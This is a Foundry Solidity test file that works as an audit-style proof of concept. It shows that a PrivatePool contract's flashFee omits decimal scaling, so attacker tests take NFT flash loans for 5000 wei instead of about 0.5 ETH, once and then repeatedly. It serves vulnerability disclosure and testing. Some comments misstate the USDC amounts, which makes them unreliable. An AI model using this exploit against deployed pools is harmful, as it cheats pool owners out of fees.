// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../../src/PrivatePool.sol";
import "../../src/Factory.sol";
import "solmate/tokens/ERC721.sol";
import "solmate/tokens/ERC20.sol";
import "openzeppelin/interfaces/IERC3156FlashBorrower.sol";

contract MockERC721 is ERC721 {
    uint256 private _tokenIdCounter;

    constructor() ERC721("Mock NFT", "MNFT") {}

    function mint(address to) public returns (uint256) {
        uint256 tokenId = _tokenIdCounter++;
        _mint(to, tokenId);
        return tokenId;
    }

    function tokenURI(uint256) public pure override returns (string memory) {
        return "";
    }
}

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MTK", 6) {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract FlashBorrower is IERC3156FlashBorrower {
    address public pool;
    
    constructor(address _pool) {
        pool = _pool;
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 tokenId,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // Approve the pool to take back the NFT
        ERC721(token).approve(pool, tokenId);
        
        // Return the NFT to the pool
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

contract ExploitTest is Test {
    PrivatePool public pool;
    Factory public factory;
    MockERC721 public nft;
    MockERC20 public baseToken;
    FlashBorrower public borrower;
    
    address public poolOwner = address(0x1);
    address public attacker = address(0x2);
    
    uint256 public constant CHANGE_FEE = 5000; // Intended to be 0.5 ETH or 5000 USDC
    
    function setUp() public {
        // Deploy factory
        factory = new Factory();
        
        // Deploy NFT collection
        nft = new MockERC721();
        
        // Mint NFTs to pool owner
        vm.startPrank(poolOwner);
        for (uint256 i = 0; i < 5; i++) {
            nft.mint(poolOwner);
        }
        vm.stopPrank();
    }
    
    function testFlashLoanFeeDiscrepancyETH() public {
        console.log("\n=== Flash Loan Fee Discrepancy (ETH Pool) ===");
        
        // Create ETH-based pool
        vm.startPrank(poolOwner);
        
        // Create pool with ETH as base token (address(0))
        address poolAddress = factory.create{value: 0}(
            address(0), // ETH
            address(nft),
            100 ether, // virtualBaseTokenReserves
            10 ether,  // virtualNftReserves
            uint56(CHANGE_FEE), // changeFee = 5000
            200, // feeRate = 2%
            bytes32(0), // merkleRoot
            false, // useStolenNftOracle
            false  // payRoyalties
        );
        
        pool = PrivatePool(payable(poolAddress));
        
        // Deposit NFTs into pool
        uint256[] memory tokenIds = new uint256[](3);
        for (uint256 i = 0; i < 3; i++) {
            tokenIds[i] = i;
            nft.approve(address(pool), i);
        }
        pool.deposit(tokenIds, 0);
        
        vm.stopPrank();
        
        // Calculate expected fee using changeFeeQuote (correct implementation)
        (uint256 expectedFee, ) = pool.changeFeeQuote(1e18);
        console.log("Expected fee (from changeFeeQuote):", expectedFee);
        
        // Get actual flash loan fee (incorrect implementation)
        uint256 actualFlashFee = pool.flashFee(address(nft), 0);
        console.log("Actual flash loan fee:", actualFlashFee);
        
        // Demonstrate the discrepancy
        console.log("Fee discrepancy factor:", expectedFee / actualFlashFee);
        
        // For ETH: exponent = 18 - 4 = 14
        // Expected: 5000 * 10^14 = 500000000000000000 (0.5 ETH)
        // Actual: 5000 wei
        assertEq(actualFlashFee, CHANGE_FEE, "Flash fee should be raw changeFee value");
        assertEq(expectedFee, CHANGE_FEE * 10**14, "Expected fee should be scaled");
        assertTrue(expectedFee > actualFlashFee * 10**13, "Massive fee discrepancy exists");
    }
    
    function testFlashLoanFeeDiscrepancyERC20() public {
        console.log("\n=== Flash Loan Fee Discrepancy (ERC20 Pool) ===");
        
        // Deploy ERC20 with 6 decimals (like USDC)
        baseToken = new MockERC20();
        
        vm.startPrank(poolOwner);
        
        // Create ERC20-based pool
        address poolAddress = factory.create{value: 0}(
            address(baseToken),
            address(nft),
            100_000_000, // 100 USDC (6 decimals)
            10 ether,
            uint56(CHANGE_FEE), // changeFee = 5000 (intended to be 5000 USDC)
            200,
            bytes32(0),
            false,
            false
        );
        
        pool = PrivatePool(payable(poolAddress));
        
        // Deposit NFTs
        uint256[] memory tokenIds = new uint256[](3);
        for (uint256 i = 0; i < 3; i++) {
            tokenIds[i] = i;
            nft.approve(address(pool), i);
        }
        pool.deposit(tokenIds, 0);
        
        vm.stopPrank();
        
        // Calculate expected fee
        (uint256 expectedFee, ) = pool.changeFeeQuote(1e18);
        console.log("Expected fee (from changeFeeQuote):", expectedFee);
        
        // Get actual flash loan fee
        uint256 actualFlashFee = pool.flashFee(address(nft), 0);
        console.log("Actual flash loan fee:", actualFlashFee);
        
        // For USDC (6 decimals): exponent = 6 - 4 = 2
        // Expected: 5000 * 10^2 = 500000 (5000 USDC)
        // Actual: 5000 (0.005 USDC)
        assertEq(actualFlashFee, CHANGE_FEE, "Flash fee should be raw changeFee value");
        assertEq(expectedFee, CHANGE_FEE * 100, "Expected fee should be scaled by 10^2");
        assertTrue(expectedFee == actualFlashFee * 100, "100x fee discrepancy for USDC");
    }
    
    function testExploitFlashLoanWithMinimalFee() public {
        console.log("\n=== Exploit Execution ===");
        
        // Setup ETH pool
        vm.startPrank(poolOwner);
        
        address poolAddress = factory.create{value: 0}(
            address(0),
            address(nft),
            100 ether,
            10 ether,
            uint56(CHANGE_FEE),
            200,
            bytes32(0),
            false,
            false
        );
        
        pool = PrivatePool(payable(poolAddress));
        
        // Deposit NFTs
        uint256[] memory tokenIds = new uint256[](3);
        for (uint256 i = 0; i < 3; i++) {
            tokenIds[i] = i;
            nft.approve(address(pool), i);
        }
        pool.deposit(tokenIds, 0);
        
        vm.stopPrank();
        
        // Attacker executes flash loan
        vm.startPrank(attacker);
        vm.deal(attacker, 1 ether);
        
        borrower = new FlashBorrower(address(pool));
        
        uint256 balanceBefore = attacker.balance;
        console.log("Attacker balance before:", balanceBefore);
        
        // Execute flash loan - only pay 5000 wei instead of 0.5 ETH
        uint256 flashFee = pool.flashFee(address(nft), 0);
        console.log("Flash loan fee charged:", flashFee);
        
        pool.flashLoan{value: flashFee}(
            borrower,
            address(nft),
            0,
            ""
        );
        
        uint256 balanceAfter = attacker.balance;
        console.log("Attacker balance after:", balanceAfter);
        
        uint256 actualCost = balanceBefore - balanceAfter;
        console.log("Actual cost paid:", actualCost);
        
        // Calculate what should have been paid
        (uint256 expectedFee, ) = pool.changeFeeQuote(1e18);
        console.log("Expected fee (should have paid):", expectedFee);
        console.log("Savings:", expectedFee - actualCost);
        
        // Verify the exploit worked
        assertEq(actualCost, CHANGE_FEE, "Only paid raw changeFee");
        assertTrue(expectedFee > actualCost * 10**13, "Saved massive amount on fees");
        
        vm.stopPrank();
    }
    
    function testRepeatedExploitation() public {
        console.log("\n=== Repeated Exploitation ===");
        
        // Setup pool
        vm.startPrank(poolOwner);
        
        address poolAddress = factory.create{value: 0}(
            address(0),
            address(nft),
            100 ether,
            10 ether,
            uint56(CHANGE_FEE),
            200,
            bytes32(0),
            false,
            false
        );
        
        pool = PrivatePool(payable(poolAddress));
        
        uint256[] memory tokenIds = new uint256[](3);
        for (uint256 i = 0; i < 3; i++) {
            tokenIds[i] = i;
            nft.approve(address(pool), i);
        }
        pool.deposit(tokenIds, 0);
        
        vm.stopPrank();
        
        // Attacker performs multiple flash loans
        vm.startPrank(attacker);
        vm.deal(attacker, 1 ether);
        
        borrower = new FlashBorrower(address(pool));
        
        uint256 balanceBefore = attacker.balance;
        uint256 flashFee = pool.flashFee(address(nft), 0);
        
        // Execute 10 flash loans
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan{value: flashFee}(
                borrower,
                address(nft),
                0,
                ""
            );
        }
        
        uint256 totalCost = balanceBefore - attacker.balance;
        console.log("Total cost for 10 flash loans:", totalCost);
        
        (uint256 expectedFeePerLoan, ) = pool.changeFeeQuote(1e18);
        uint256 expectedTotalCost = expectedFeePerLoan * 10;
        console.log("Expected total cost:", expectedTotalCost);
        console.log("Total savings:", expectedTotalCost - totalCost);
        
        // Verify repeated exploitation
        assertEq(totalCost, CHANGE_FEE * 10, "Only paid raw changeFee per loan");
        assertTrue(expectedTotalCost > totalCost * 10**13, "Massive savings on repeated loans");
        
        vm.stopPrank();
    }
}
